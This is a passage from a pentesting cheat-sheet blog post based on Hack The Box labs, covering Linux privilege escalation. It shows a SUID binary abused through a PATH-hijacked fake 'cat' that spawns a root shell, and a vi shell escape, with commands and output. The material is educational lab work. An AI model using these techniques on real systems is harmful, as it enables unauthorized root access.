<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / <span class="nt">-group</span> bugtracker 2&gt;/dev/null
</code></pre></div></div>
<h4 id="set-owner-user-id-">Set owner User ID <a name="privilege-escalation-suid"></a></h4>

<p>If any, check the file flags and permissions:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>robert@oopsie:/var/www/html<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-lisa</span> /usr/bin/bugtracker <span class="o">&amp;&amp;</span> file /usr/bin/bugtracker
&lt;isa /usr/bin/bugtracker <span class="o">&amp;&amp;</span> file /usr/bin/bugtracker
264151 12 <span class="nt">-rwsr-xr--</span> 1 root bugtracker 8792 Jan 25  2020 /usr/bin/bugtracker
/usr/bin/bugtracker: setuid ELF 64-bit LSB shared object, x86-64, version 1 <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib64/l, <span class="k">for </span>GNU/Linux 3.2.0, BuildID[sha1]<span class="o">=</span>b87543421344c400a95cbbe34bbc885698b52b8d, not stripped
</code></pre></div></div>

<p>The flags show <code class="language-plaintext highlighter-rouge">s</code> and file shows <code class="language-plaintext highlighter-rouge">setuid</code>. That is a special permission named SUID or Set Owner User ID. SUID allows an alternate user to run an executable with the same permissions as the owner of the file instead of the permissions of the alternate user. That looks promising for privilede escalation.</p>

<p>In our case, the binary ‘bugtracker’ is owned by root &amp; we can execute it as root since it has SUID set.</p>

<p>If we execute the app, we can see that is asking for input. On invalid input it shows an error showing that it’s using <code class="language-plaintext highlighter-rouge">cat</code> command:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>robert@oopsie:/var/www/html<span class="nv">$ </span>bugtracker 12
bugtracker 12

<span class="nt">------------------</span>
: EV Bug Tracker :
<span class="nt">------------------</span>

Provide Bug ID: 12
12
<span class="nt">---------------</span>

<span class="nb">cat</span>: /root/reports/12: No such file or directory
</code></pre></div></div>
<p>Looks like it’s not using the full path of the cat tool. We can create a executable named <code class="language-plaintext highlighter-rouge">cat</code> and put it before in PATH and it will execute that <code class="language-plaintext highlighter-rouge">cat</code> (/tmp/cat) instead of the real <code class="language-plaintext highlighter-rouge">cat</code>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>echo "/bin/sh" &gt; /tmp/cat
robert@oopsie:/var/www/html$ export PATH=/tmp:$PATH
robert@oopsie:/var/www/html$ echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
robert@oopsie:/var/www/html$ bugtracker	
bugtracker

------------------
: EV Bug Tracker :
------------------

Provide Bug ID: 12
12
---------------

# whoami
whoami
root
</code></pre></div></div>

<p>and we have root access.</p>

<h4 id="abuse-regular-application-">Abuse regular application <a name="privilege-escalation-app"></a></h4>

<p>If <code class="language-plaintext highlighter-rouge">sudo -l</code> shows permission for any binary, check <a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a> for a way to exploit the binary to gain root access.</p>

<p>E.g.: you can get root access with vim. If the user has sudo access to edit some file, you can abuse it to get root access:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vi
:set <span class="nv">shell</span><span class="o">=</span>/bin/sh
:shell
</code></pre></div></div>

<p>Another case, might be seeing a unix socket (docker or lxd) with potential root permissions, in that case check in hacktrics: <a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation">https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation</a></p>

    
  </section>

  <!-- Social media shares -->
  

<div class="share-buttons">
    <ul class="share-buttons">
        <li class="meta">Share</li>
        
        <li>
            <a href="https://www.facebook.com/sharer/sharer.php?u=https://www.agalera.eu/pentesting-playbook/" target="_blank"
               title=" Facebook">
                <i class="fab fa-facebook-square fa-2x" aria-hidden="true"></i>
                <span class="sr-only">Share on Facebook</span>
            </a>
        </li>
         
        <li>
            <a href="https://twitter.com/intent/tweet?text=Pentesting+playbook%20https%3A%2F%2Fwww.agalera.eu%2Fpentesting-playbook%2F"
               target="_blank" title="">
                <i class="fab fa-twitter-square fa-2x" aria-hidden="true"></i>
                <span class="sr-only">Tweet</span>
            </a>
        </li>
         
        <li>
            <a href="https://www.tumblr.com/share?v=3&u=https://www.agalera.eu/pentesting-playbook/&quote=Pentesting+playbook%20%7C%20Adrian+Galera+blog&s="
               target="_blank" title=" Tumblr">
                <i class="fab fa-tumblr-square fa-2x" aria-hidden="true"></i>
                <span class="sr-only">Share on Tumblr</span>
            </a>
        </li>
         
        <li>
            <a href="https://pinterest.com/pin/create/button/?url=https://www.agalera.eu/pentesting-playbook/&media=https://www.agalera.eu/assets/img/posts/hack-the-box-cheatsheet/featured.jpg$description=I+have+started+playing+around+in+https%3A%2F%2Fwww.hackthebox.com+platform+and+I%E2%80%99ll+use+this+article+to+save+all+the+steps+I+take+to+complete+the+challenges.%0A%0A%0A%0A"
               target="_blank" title="">
                <i class="fab fa-pinterest-square fa-2x" aria-hidden="true"></i>
                <span class="sr-only">Pin it</span>
            </a>
        </li>
          
        <li>
            <a href="https://www.reddit.com/submit?url=https://www.agalera.eu/pentesting-playbook/&title=Pentesting+playbook%20%7C%20Adrian+Galera+blog"
               target="_blank" title=" Reddit">
                <i class="fab fa-reddit-square fa-2x" aria-hidden="true"></i>
                <span class="sr-only">Share on Reddit</span>
            </a>
        </li>
         
        <li>
            <a href="https://www.linkedin.com/shareArticle?mini=true&url=https://www.agalera.eu/pentesting-playbook/&title=Pentesting+playbook%20%7C%20Adrian+Galera+blog&summary=&source=https://www.agalera.eu/pentesting-playbook/"
               target="_blank" title=" LinkedIn">
                <i class="fab fa-linkedin fa-2x" aria-hidden="true"></i>
                <span class="sr-only">Share on LinkedIn</span>
            </a>
        </li>
          
        <li>
            <a href="mailto:?subject=Pentesting playbook%20%7C%20Adrian Galera blog&body=https://www.agalera.eu/pentesting-playbook/"
               target="_blank" title="">
                <i class="fas fa-envelope-square fa-2x" aria-hidden="true"></i>
                <span class="sr-only">Email</span></a>
        </li>
        
    </ul>
</div>




   <!-- Tag list -->
  
  


  <div class="tag-list">
    <ul>
      
        <li class="meta">Tags</li>
      

      
        <li><a class="button" href="/tags#hack-the-box">
          <p><i class="fas fa-tag fa-fw fa-sm"></i> hack-the-box</p>
        </a></li>
      
        <li><a class="button" href="/tags#hacking">
          <p><i class="fas fa-tag fa-fw fa-sm"></i> hacking</p>
        </a></li>
      
        <li><a class="button" href="/tags#linux">
          <p><i class="fas fa-tag fa-fw fa-sm"></i> linux</p>
        </a></li>
      
        <li><a class="button" href="/tags#pentesting">
          <p><i class="fas fa-tag fa-fw fa-sm"></i> pentesting</p>
        </a></li>
      
    </ul>
  </div>



</article>

<!-- Post navigation -->

<div id="post-nav">
    
    <div id="previous-post">
        <a alt="Reversing playbook" href="/reversing-playbook/">
            <p>Previous post</p>
            Reversing playbook
        </a>
    </div>
    

    
    <div id="next-post">
        <a alt="Pentesting tools" href="/pentesting-tools/">
            <p>Next post</p>
            Pentesting tools
        </a>
    </div>
    
</div>



<!--Utterances-->


<!-- Cusdis -->


<!-- Disqus -->


<!-- To change color of links in the page -->
<style>
  header#main {
      background-size: cover;
      background-repeat: no-repeat;
      background-position: center;
  }

  

  
  header#main { background-image: url('/assets/img/posts/hack-the-box-cheatsheet/featured.jpg'); }
  
</style>

    </div>
    <footer class="site-footer">
    <p class="text">
        </p>
            <div class="footer-icons">
                <ul>
                <!-- Social icons from Font Awesome, if enabled -->
                
<li>
    <a feed.xml href="/feed.xml"
       title="Follow RSS feed"
       target="_blank">
        <span class="fa-stack fa-lg">
            <i class="fas fa-circle fa-stack-2x"></i>
            <i class="fas fa-rss fa-stack-1x fa-inverse"></i>
        </span>
    </a>
</li>



    

    

    

    

    

    

    
        
        
        
        
        <li>
            <a href="https://github.com/adriangalera"
               title="Follow on Github"
               target="_blank"
               rel="noopener">
            <span class="fa-stack fa-lg">
              <i class="fas fa-circle fa-stack-2x"></i>
              <i class="fab fa-github fa-stack-1x fa-inverse"></i>
            </span>
            </a>
        </li>
    

    

    

    

    

    

    
        
        
        
        
        <li>
            <a href="https://www.linkedin.com/in/adriangalera"
               title="Follow on Linkedin"
               target="_blank"
               rel="noopener">
            <span class="fa-stack fa-lg">
              <i class="fas fa-circle fa-stack-2x"></i>
              <i class="fab fa-linkedin fa-stack-1x fa-inverse"></i>
            </span>
            </a>
        </li>
    

    
        
        
        
        
        <li>
            <a href="mailto:adrian.galera.87@gmail.com"
               title="Follow on Mail"
               target="_blank"
               rel="noopener">
            <span class="fa-stack fa-lg">
              <i class="fas fa-circle fa-stack-2x"></i>
              <i class="fas fa-envelope fa-stack-1x fa-inverse"></i>
            </span>
            </a>
        </li>
    

    

    

    

    

    

    

    

    

    

    

    

    

    

    

    

    

    

    

    

    

    


                </ul>
            </div>
</footer>



  </body>
</html>
